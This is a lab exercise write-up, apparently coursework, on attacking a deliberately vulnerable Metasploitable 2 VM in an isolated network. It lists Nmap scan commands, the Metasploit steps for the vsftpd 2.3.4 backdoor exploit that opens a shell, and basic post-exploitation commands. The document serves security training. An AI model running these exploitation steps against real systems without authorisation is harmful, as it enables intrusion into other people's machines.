# Experiment 2: Safe Exploitation of a Vulnerable Virtual Machine using Metasploit

## Aim

To perform safe exploitation of a vulnerable virtual machine using Metasploit.

## Requirements

- Kali Linux
- Metasploitable 2
- VirtualBox/VMware
- Nmap
- Metasploit

## Theory

Metasploit is a penetration testing framework used to identify and exploit vulnerabilities in computer systems.

In this experiment, Nmap is used for reconnaissance, and Metasploit is used for controlled exploitation of a vulnerable service.

## Procedure

### 1. Network Setup

Connect Kali Linux and Metasploitable 2 using a **Host-Only Adapter** or **Internal Network**.

Check the IP address of the target:

```bash
ifconfig
Verify connectivity between Kali Linux and Metasploitable 2:

ping <Metasploitable_IP>
2. Nmap Scanning

Perform a SYN scan, service version detection, and operating system detection:

nmap -sS -sV -O <Metasploitable_IP>

Identify open ports and vulnerable services from the scan results.

3. Metasploit Exploitation

Start the Metasploit Framework:

msfconsole

Search for the vsftpd vulnerability:

search vsftpd

Load the appropriate exploit:

use exploit/unix/ftp/vsftpd_234_backdoor

Set the target IP address:

set RHOST <Metasploitable_IP>

Set the FTP port:

set RPORT 21

Run the exploit:

exploit

If the target is vulnerable and the exploit succeeds, a command shell session may be opened.

4. Post-Exploitation

Check the current user:

whoami

Display system information:

uname -a

Display network configuration:

ifconfig
Result

The experiment demonstrated network scanning and controlled exploitation using Metasploit on Metasploitable 2.

Conclusion

Nmap was successfully used for reconnaissance to identify open ports and services. Metasploit was then used to perform controlled exploitation of the vulnerable vsftpd service in the authorized Metasploitable 2 lab environment.
